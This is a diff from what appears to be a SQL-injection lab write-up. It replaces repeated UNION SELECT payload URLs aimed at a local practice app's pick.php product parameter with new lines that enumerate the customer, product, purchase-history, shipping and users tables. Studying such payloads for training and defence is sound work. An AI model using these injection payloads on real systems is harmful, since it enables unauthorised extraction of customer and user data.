@@ -140,16 +140,14 @@ ________________________________________________________________________________
     http://127.0.0.1:20002/pick.php?product=7 UNION SELECT id,3,name FROM siteusers.customer
     http://127.0.0.1:20002/pick.php?product=7 UNION SELECT account,3,category FROM siteusers.customer
     http://127.0.0.1:20002/pick.php?product=7 UNION SELECT description,3,2 FROM siteusers.customer
-    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT name,account,description FROM siteusers.customer
-    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT name,account,description FROM siteusers.customer
-    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT name,account,description FROM siteusers.customer
-    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT name,account,description FROM siteusers.customer
-    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT name,account,description FROM siteusers.customer
-    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT name,account,description FROM siteusers.customer
-    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT name,account,description FROM siteusers.customer
-    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT name,account,description FROM siteusers.customer
-    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT name,account,description FROM siteusers.customer
-    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT name,account,description FROM siteusers.customer
+    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT id,3,quantity FROM siteusers.net_products
+    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT product,3,price FROM siteusers.net_products
+    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT id,3,quantity FROM siteusers.purchase_history
+    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT product,3,account FROM siteusers.purchase_history
+    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT id,3,ordernumber FROM siteusers.shippingdates
+    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT account,3,date FROM siteusers.shippingdates
+    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT user_id,3,name FROM siteusers.users
+    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT username,3,2 FROM siteusers.users
 ______________________________________________________________________________________________________________
 ## 
 ### 
